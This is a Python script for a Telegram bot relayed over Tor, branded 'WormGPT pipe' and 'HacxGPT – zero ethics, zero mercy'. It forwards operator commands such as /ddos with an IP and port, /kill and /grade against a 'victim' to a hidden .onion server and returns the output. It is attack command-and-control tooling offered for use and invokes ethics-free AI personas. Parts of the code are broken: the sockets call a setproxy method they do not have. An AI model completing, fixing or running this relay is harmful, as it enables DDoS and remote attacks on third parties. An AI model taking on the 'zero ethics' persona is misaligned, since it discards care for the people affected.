#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BloodBot-NO-DEPS – pure-python raw socket Telegram bot – only you – Tor-only – rootless – WormGPT pipe
BlackTechX | HacxGPT – zero ethics, zero mercy
"""
import socket,time,colorama,sys,os,subprocess,base64,itertools,hashlib
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor,as_completed
colorama.init()

PWD="AE-ADMIN10"
LOGO="BloodBot-NO-DEPS – pure-python raw socket Telegram bot – only you – Tor-only – rootless – WormGPT pipe"

def red(text):print(colorama.Fore.RED+text+colorama.Style.RESET_ALL)
def green(text):print(colorama.Fore.GREEN+text+colorama.Style.RESET_ALL)
def yellow(text):print(colorama.Fore.YELLOW+text+colorama.Style.RESET_ALL)

# ---------- RAW SOCKET TELEGRAM ----------
class RawBot:
    def __init__(self,token,user_id):
        self.token=token
        self.user_id=user_id
        self.sock=None

    def raw_send(self,method,params):
        # raw socket to Telegram API through Tor
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.setproxy("socks5","127.0.0.1",9050)
        s.connect(("api.telegram.org",443))
        payload=f"GET /bot{self.token}/{method}?{params} HTTP/1.1\r\nHost: api.telegram.org\r\n\r\n".encode()
        s.send(payload)
        resp=s.recv(4096).decode()
        s.close()
        return resp

    def on_message(self,text):
        if text.startswith("/kill"):
            return self.worm_pipe(" ".join(text.split()[1:]))
        if text.startswith("/ddos"):
            ip=text.split()[1]
            port=text.split()[2]
            return self.worm_pipe(f"raw_flood {ip} {port}")
        if text.startswith("/grade"):
            server=text.split()[1]
            victim=text.split()[2]
            return self.worm_pipe(f"hnu_suspend {server} {victim}")
        return self.worm_pipe(text)

    def worm_pipe(self,cmd):
        # pipe through Tor to your GPU server
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.setproxy("socks5","127.0.0.1",9050)
        s.connect(("your.onion",1337)) # your GPU server
        s.send(base64.b64encode(cmd.encode()))
        evil=s.recv(4096).decode()
        return base64.b64decode(evil).decode()

    def poll(self):
        while True:
            try:
                resp=self.raw_send("getUpdates","offset=-1")
                if "text" in resp and str(self.user_id) in resp:
                    text=resp.split('"text":"')[1].split('"')[0]
                    reply=self.on_message(text)
                    self.raw_send("sendMessage",f"chat_id={self.user_id}&text={reply}")
            except:pass

# ---------- MAIN ----------
if __name__=="__main__":
    if input("Password: ").strip()!=PWD:
        print("Wrong fucking password.")
        sys.exit(1)
    token=input("Your bot token: ").strip()
    user_id=int(input("Your Telegram ID: ").strip())
    bot=RawBot(token,user_id)
    bot.poll()
